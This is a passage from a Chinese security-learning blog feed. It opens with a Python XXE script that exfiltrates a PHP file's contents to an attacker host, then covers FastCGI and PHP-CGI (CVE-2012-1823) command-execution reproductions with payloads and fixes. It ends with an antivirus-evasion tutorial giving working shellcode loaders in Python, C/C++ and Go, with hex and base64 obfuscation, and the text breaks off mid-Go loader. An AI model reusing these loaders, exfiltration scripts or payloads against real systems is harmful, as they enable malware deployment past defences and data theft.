<h4 id="python编写xml注入脚本"><a href="#python编写xml注入脚本" class="headerlink" title="python编写xml注入脚本"></a>python编写xml注入脚本</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">from http.server import HTTPServer,CGIHTTPRequestHandler</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def web_server():</span><br><span class="line">    port = 3344</span><br><span class="line">    httpd = HTTPServer(('',port),CGIHTTPRequestHandler)</span><br><span class="line">    print("[*] Starting simple_httpd on port:",httpd.server_port)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line">def send_data():</span><br><span class="line">    files = 'C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php'</span><br><span class="line">    data = "<span class="meta">&lt;?xml version=\"1.0\"?&gt;</span>\r\n<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [\r\n<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> \<span class="meta-string">"php://filter/read=convert.base64-encode/resource=C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\"&gt;\r\n&lt;!ENTITY % dtd SYSTEM \"http://192.168.181.128/evil.xml\" &gt;\r\n%dtd;\r\n%send;\r\n]&gt;"</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">requests</span>.post("<span class="meta-keyword">http</span>://192.168.181.138/<span class="meta-keyword">xxe-lab-master</span>/<span class="meta-keyword">php_xxe</span>/",<span class="meta-keyword">data</span>=<span class="meta-keyword">data</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">files</span> = <span class="meta-keyword">input</span>("<span class="meta-keyword">Write</span> <span class="meta-keyword">filename</span>")</span></span></span><br><span class="line"><span class="meta"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="meta">if <span class="meta-keyword">__name__</span> == <span class="meta-string">'__main__'</span>:</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span> = <span class="meta-keyword">open</span>('<span class="meta-keyword">evil</span>.<span class="meta-keyword">xml</span>','w')</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span>.write("&lt;!<span class="meta-keyword">ENTITY</span> % <span class="meta-keyword">payload</span> \"&lt;!<span class="meta-keyword">ENTITY</span> &amp;<span class="meta-keyword">#x25</span>; <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> '<span class="meta-keyword">HTTP</span>://192.168.181.128/?<span class="meta-keyword">content</span>=%<span class="meta-keyword">file</span>;'&gt;\"&gt; %<span class="meta-keyword">payload</span>;")</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span>.close()</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t1</span> = <span class="meta-keyword">threading</span>.Thread(<span class="meta-keyword">target</span>=<span class="meta-keyword">web_server</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t1</span>.start()</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t2</span> = <span class="meta-keyword">threading</span>.Thread(<span class="meta-keyword">target</span>=<span class="meta-keyword">send_data</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t2</span>.start()</span></span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>python编程学习</category>
      </categories>
  </entry>
  <entry>
    <title>免杀学习--powershell加载shellcode免杀</title>
    <url>/2021/08/06/mian-sha-xue-xi-powershell-jia-zai-shellcode-mian-sha/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="258a844e7cff47f57befe1b51848684055627ff4d5c9bbfc8f15865ad60a14f1"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>其他中间件漏洞</title>
    <url>/2020/04/03/qi-ta-zhong-jian-jian-lou-dong/</url>
    <content><![CDATA[<h2 id="其它中间件相关漏洞"><a href="#其它中间件相关漏洞" class="headerlink" title="其它中间件相关漏洞"></a>其它中间件相关漏洞</h2><h4 id="FastCGI未授权访问、任意命令执行"><a href="#FastCGI未授权访问、任意命令执行" class="headerlink" title="FastCGI未授权访问、任意命令执行"></a>FastCGI未授权访问、任意命令执行</h4><p><strong>1、 漏洞简介及成因</strong></p>
<p>服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。</p>
<p>参考P牛文章：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<p><strong>2、 漏洞复现</strong></p>
<p>使用vulhub实验环境，启动实验环境。</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span> <span class="string">/vulhub/fpm</span></span><br><span class="line">docker-compose build &amp;&amp; docker-compose up -d</span><br></pre></td></tr></table></figure>

<p><strong>EXP</strong>:<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p>
<p>在攻击机使用命令python fpm.py 192.168.237.136 /etc/passwd，观察返回结果。</p>
<p><a href="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955569_5c1626b181057.png!small" alt="img"></a></p>
<p>由于访问非*.PHP文件，所以返回结果403。</p>
<p>使用命令执行一个默认存在的 php 文件。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">python fpm.py <span class="number">192.168</span>.<span class="number">237.136</span> /usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">php</span>/<span class="title">PEAR</span>.<span class="title">php</span></span></span><br></pre></td></tr></table></figure>



<p><a href="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955581_5c1626bd94566.png!small" alt="img"></a></p>
<p>利用命令进行任意命令执行复现。</p>
<figure class="highlight crystal"><table><tr><td class="code"><pre><span class="line">python fpm.py <span class="number">192.168</span>.<span class="number">139.129</span> /usr/local/<span class="class"><span class="keyword">lib</span>/<span class="title">php</span>/<span class="title">PEAR</span>.<span class="title">php</span>-<span class="title">c</span> '&lt;?<span class="title">php</span> <span class="title">echo</span> `<span class="title">pwd</span>`;</span> ?&gt;<span class="string">'</span></span><br><span class="line"><span class="string">python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c '</span>&lt;?php echo <span class="string">`ifconfig`</span>; ?&gt;<span class="string">'</span></span><br><span class="line"><span class="string">python fpm.py 192.168.139.129 /usr/local/lib/php/PEAR.php-c '</span>&lt;?php echo <span class="string">`ls`</span>; ?&gt;<span class="string">'</span></span><br></pre></td></tr></table></figure>

<p><a href="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955594_5c1626ca98c2c.png!small" alt="img"></a></p>
<p><strong>3、 漏洞修复</strong></p>
<p>更改默认端口</p>
<h3 id="（二）-PHPCGI远程代码执行"><a href="#（二）-PHPCGI远程代码执行" class="headerlink" title="（二） PHPCGI远程代码执行"></a>（二） PHPCGI远程代码执行</h3><p><strong>1、 漏洞简介及成因</strong></p>
<p>在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。</p>
<p>此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。</p>
<p><a href="http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a><br>p牛讲的很详细：<a href="https://vulhub.org/#/environments/php/CVE-2012-1823/" target="_blank" rel="noopener">https://vulhub.org/#/environments/php/CVE-2012-1823/</a></p>
<p><strong>2、 漏洞复现</strong></p>
<p>cgi模式下有如下一些参数可用：</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-c 指定php.ini文件的位置</span></span><br><span class="line"><span class="deletion">-n 不要加载php.ini文件</span></span><br><span class="line"><span class="deletion">-d 指定配置项</span></span><br><span class="line"><span class="deletion">-b 启动fastcgi进程</span></span><br><span class="line"><span class="deletion">-s 显示文件源码</span></span><br><span class="line"><span class="deletion">-T 执行指定次该文件</span></span><br><span class="line"><span class="deletion">-h和-? 显示帮助</span></span><br></pre></td></tr></table></figure>

<p>通过使用<code>-d</code>指定<code>auto_prepend_file</code>来制造任意文件包含漏洞，执行任意代码：<br><code>auto_prepend_file</code>与<code>auto_append_file</code>:将文件require到所有页面的顶部与底部。<br>空格用<code>+</code>或<code>%20</code>代替，<code>=</code>用url编码代替。<br>payload：<code>-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input</code></p>
<p>使用vulhub实验环境，启动环境。</p>
<p>访问<a href="http://192.168.139.129:8080/index.php。" target="_blank" rel="noopener">http://192.168.139.129:8080/index.php。</a></p>
<p><a href="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955605_5c1626d552e60.png!small" alt="img"></a></p>
<p>抓包，修改包。</p>
<p><a href="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20181216/1544955613_5c1626dd7ad9f.png!small" alt="img"></a></p>
<p>命令成功执行。</p>
<p><strong>3、 漏洞修复</strong></p>
<p>三种方法：</p>
<p>1）升级php版本；（php-5.3.12以上版本）;</p>
<p>2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。</p>
<p>具体做法：</p>
<p>修改http.conf文件，找到<Directory>增加以下三行</Directory></p>
<p>RewriteEngine on</p>
<p>RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]</p>
<p>RewriteRule ^(.*) $1? [L]</p>
<p>重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。</p>
<p>3）打上php补丁。</p>
<p>补丁下载地址:<a href="https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/" target="_blank" rel="noopener">https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/</a></p>
]]></content>
      <categories>
        <category>中间件漏洞学习</category>
      </categories>
      <tags>
        <tag>FastCGI</tag>
      </tags>
  </entry>
  <entry>
    <title>songcms代码审计</title>
    <url>/2020/06/28/songcms-dai-ma-shen-ji/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">Hey, password is required here.</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="0d40fa440b1139558445280af55557578d30f679f118831bbbd71c00e7c252a7"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>php代码审计学习</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>免杀学习--shellcode加载免杀</title>
    <url>/2021/08/17/mian-sha-xue-xi-shellcode-jia-zai-mian-sha/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        这段时间测试了不少免杀的手法，但是对一些加载器的实现原理还没有完全理清，所以本文主要是学习总结原理和姿势，不测试实际免杀效果。</p>
<p>​        目前来看分离免杀仍然是主流的一种免杀方式，我们可以将shellcode比作子弹，那么枪也就是我们所说的加载器。在这种情况下对于杀软来说，单纯的枪或者说子弹，都有可能绕过杀软。</p>
<h3 id="python加载器"><a href="#python加载器" class="headerlink" title="python加载器"></a>python加载器</h3><p>核心代码:</p>
<figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="title">shellcode</span> = bytearray(<span class="string">"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b"</span>)</span><br><span class="line"></span><br><span class="line">#通过调用<span class="type">VirtualAlloc</span>函数，申请一块动态内存区域</span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),#要分配的内存区域的地址</span><br><span class="line">                                          ctypes.c_int(len(shellcode)), #分配的大小</span><br><span class="line">                                          ctypes.c_int(0x3000), #分配的类型</span><br><span class="line">                                          ctypes.c_int(0x40)) #该内存的初始保护属性</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line"></span><br><span class="line">#调用<span class="type">RtlMoveMemory</span>函数，函数从我们指定的内存复制内容到另一内存</span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                    buf,</span><br><span class="line">                                    ctypes.c_int(len(shellcode)))</span><br><span class="line"></span><br><span class="line">#调用<span class="type">CreateThread</span>将在主线程的基础上创建一个新线程</span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line"></span><br><span class="line">#调用<span class="type">WaitForSingleObject</span>函数等待创建的线程运行结束。</span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>

<p>代码不是很长，可以看到主要调用的就是ctypes这个库。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ctypes</span> 是 Python 的外部函数库。它提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装。</span><br></pre></td></tr></table></figure>

<p>主要流程</p>
<ul>
<li>调用VirtualAlloc函数，来申请一块可读可写可执行的动态内存区域。</li>
<li>调用RtlMoveMemory函数，此函数从指定内存中复制内容至另一内存里。</li>
<li>调用CreateThread函数，在主线程的基础上创建一个新线程。</li>
<li>调用WaitForSingleObject函数，等待创建的线程运行结束。</li>
</ul>
<p><strong>当然目前来说这种比较原始的方式杀软已经杀很严了，所以之后更多要有混淆加密的操作</strong>。</p>
<p>常见的有Hex加密、AES加密、XOR加密、base64等等，或者可以自己写加密和解密，免杀效果会更好</p>
<h3 id="加载器"><a href="#加载器" class="headerlink" title="加载器"></a>加载器</h3><h4 id="HEX加密"><a href="#HEX加密" class="headerlink" title="HEX加密"></a>HEX加密</h4><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">#sc = <span class="string">"DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"</span></span><br><span class="line"><span class="title">shellcode</span>=bytearray(sys.argv[<span class="number">1</span>].decode(<span class="string">"hex"</span>))</span><br><span class="line"></span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>

<h4 id="base64加密"><a href="#base64加密" class="headerlink" title="base64加密"></a>base64加密</h4><figure class="highlight elm"><table><tr><td class="code"><pre><span class="line">#scrun by k8gege</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">#<span class="type">REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA</span>==</span><br><span class="line"><span class="title">shellcode</span>=bytearray(base64.b64decode(sys.argv[<span class="number">1</span>]).decode(<span class="string">"hex"</span>))</span><br><span class="line"><span class="title">ptr</span> = ctypes.windll.kernel32.<span class="type">VirtualAlloc</span>(ctypes.c_int(0),</span><br><span class="line">                                          ctypes.c_int(len(shellcode)),</span><br><span class="line">                                          ctypes.c_int(0x3000),</span><br><span class="line">                                          ctypes.c_int(0x40))</span><br><span class="line">  </span><br><span class="line"><span class="title">buf</span> = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">RtlMoveMemory</span>(ctypes.c_int(ptr),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ht</span> = ctypes.windll.kernel32.<span class="type">CreateThread</span>(ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(ptr),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.c_int(0),</span><br><span class="line">                                         ctypes.pointer(ctypes.c_int(0)))</span><br><span class="line">  </span><br><span class="line"><span class="title">ctypes</span>.windll.kernel32.<span class="type">WaitForSingleObject</span>(ctypes.c_int(ht),ctypes.c_int(-1))</span><br></pre></td></tr></table></figure>

<h3 id="C-加载器"><a href="#C-加载器" class="headerlink" title="C++加载器"></a>C++加载器</h3><p>对于C/C++来说，常用的加载方式有<strong>函数指针执行、内联汇编指令、伪指令等方式</strong>.</p>
<h4 id="函数指针执行"><a href="#函数指针执行" class="headerlink" title="函数指针执行"></a>函数指针执行</h4><p>简单的C代码:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">  (*(<span class="keyword">void</span>(*)() shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    <strong>(void(*)() shellcode</strong> 将shellcode转换为函数指针，指向void形式的函数，然后再通过一个*对指针进行取值，之后通过()双括号调用函数进而执行shell从而执行shellocde。</p>
<h4 id="动态内存加载"><a href="#动态内存加载" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">"/subsystem:\"Windows\" /entry:\"mainCRTStartup\""</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] = </span><br><span class="line"><span class="string">"shellcode"</span>;</span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> *Memory; </span><br><span class="line">	</span><br><span class="line"> 	Memory=VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>(Memory, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">	</span><br><span class="line"> 	((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原理和上面python实现类似。</p>
<h4 id="内联汇编指令"><a href="#内联汇编指令" class="headerlink" title="内联汇编指令"></a>内联汇编指令</h4><p>汇编指令相关的知识可以看这里:</p>
<p><a href="https://www.cxyzjd.com/article/Hkenter/2855771" target="_blank" rel="noopener">免杀、汇编指令大全_K的专栏-程序员宅基地 - 程序员宅基地 (cxyzjd.com)</a></p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line"></span><br><span class="line">//#pragma comment(linker,"/subsystem:<span class="symbol">\"</span>windows<span class="symbol">\"</span> /entry:<span class="symbol">\"</span>mainCRTStartup<span class="symbol">\"</span>")  // 隐藏控制台窗口显示</span><br><span class="line">#pragma comment(linker,"/INCREMENTAL:NO")                                     // 减小编译体积</span><br><span class="line">#pragma comment(linker, "/section:.data,RWE")                                 // 启用数据段可读写</span><br><span class="line"></span><br><span class="line">unsigned char shellcode[] =</span><br><span class="line">"<span class="symbol">\x</span>d9<span class="symbol">\x</span>c5<span class="symbol">\x</span>d9<span class="symbol">\x</span>74<span class="symbol">\x</span>24<span class="symbol">\x</span>f4<span class="symbol">\x</span>ba<span class="symbol">\x</span>8b<span class="symbol">\x</span>fc<span class="symbol">\x</span>02<span class="symbol">\x</span>dd<span class="symbol">\x</span>5e<span class="symbol">\x</span>2b<span class="symbol">\x</span>c9<span class="symbol">\x</span>b1"</span><br><span class="line">"<span class="symbol">\x</span>56<span class="symbol">\x</span>83<span class="symbol">\x</span>ee<span class="symbol">\x</span>fc<span class="symbol">\x</span>31<span class="symbol">\x</span>56<span class="symbol">\x</span>14<span class="symbol">\x</span>03<span class="symbol">\x</span>56<span class="symbol">\x</span>9f<span class="symbol">\x</span>1e<span class="symbol">\x</span>f7<span class="symbol">\x</span>21<span class="symbol">\x</span>77<span class="symbol">\x</span>5c"</span><br><span class="line">"<span class="symbol">\x</span>f8<span class="symbol">\x</span>d9<span class="symbol">\x</span>87<span class="symbol">\x</span>01<span class="symbol">\x</span>70<span class="symbol">\x</span>3c<span class="symbol">\x</span>b6<span class="symbol">\x</span>01<span class="symbol">\x</span>e6<span class="symbol">\x</span>34<span class="symbol">\x</span>e8<span class="symbol">\x</span>b1<span class="symbol">\x</span>6c<span class="symbol">\x</span>18<span class="symbol">\x</span>04"</span><br><span class="line">"<span class="symbol">\x</span>39<span class="symbol">\x</span>20<span class="symbol">\x</span>89<span class="symbol">\x</span>9f<span class="symbol">\x</span>4f<span class="symbol">\x</span>ed<span class="symbol">\x</span>be<span class="symbol">\x</span>28<span class="symbol">\x</span>e5<span class="symbol">\x</span>cb<span class="symbol">\x</span>f1<span class="symbol">\x</span>a9<span class="symbol">\x</span>56<span class="symbol">\x</span>2f<span class="symbol">\x</span>93"</span><br><span class="line">"<span class="symbol">\x</span>ca<span class="symbol">\x</span>ec<span class="symbol">\x</span>3f<span class="symbol">\x</span>cd<span class="symbol">\x</span>34<span class="symbol">\x</span>a2<span class="symbol">\x</span>40<span class="symbol">\x</span>c4";</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		  mov eax, offset shellcode;</span><br><span class="line">		  JMP EAX</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其他的写法:</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">void</span> RunShellCode()  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="attribute">__asm</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attribute">lea</span> eax, shellcode;  </span><br><span class="line">        <span class="attribute">jmp</span> eax;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>MOV EAX, offset shellcode</strong><br>此指令意为将 shellcode 放入到寄存器 EAX 中</p>
<p><strong>JMP EAX</strong><br>无条件跳转到EAX</p>
<h4 id="伪指令"><a href="#伪指令" class="headerlink" title="伪指令"></a>伪指令</h4><p>​    伪指令(Pseudo Instruction)是用于对汇编过程进行控制的指令，该类指令并不是可执行指令，没有机器代码，只用于汇编过程中为汇编程序提供汇编信息。 例如，提供如下信息：哪些是指令、哪些是数据及数据的字长、程序的起始地址和结束地址等。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">void</span> RunShellCode_5()  </span><br><span class="line">&#123;  </span><br><span class="line">    <span class="attribute">__asm</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="attribute">mov</span> eax, offset shellcode;  </span><br><span class="line">        <span class="attribute">_emit</span> 0xFF;  </span><br><span class="line">        <span class="attribute">_emit</span> 0xE0;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="go加载器"><a href="#go加载器" class="headerlink" title="go加载器"></a>go加载器</h3><h4 id="动态内存加载-1"><a href="#动态内存加载-1" class="headerlink" title="动态内存加载"></a>动态内存加载</h4><p>核心代码如下:</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">"syscall"</span></span><br><span class="line">	<span class="string">"unsafe"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">	MEM_COMMIT             = <span class="number">0x1000</span></span><br><span class="line">	MEM_RESERVE            = <span class="number">0x2000</span></span><br><span class="line">	PAGE_EXECUTE_READWRITE = <span class="number">0x40</span> <span class="comment">// 区域可以执行代码，应用程序可以读写该区域。</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	kernel32      = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</span><br><span class="line">	ntdll         = syscall.MustLoadDLL(<span class="string">"ntdll.dll"</span>)</span><br><span class="line">	VirtualAlloc  = kernel32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</span><br><span class="line">	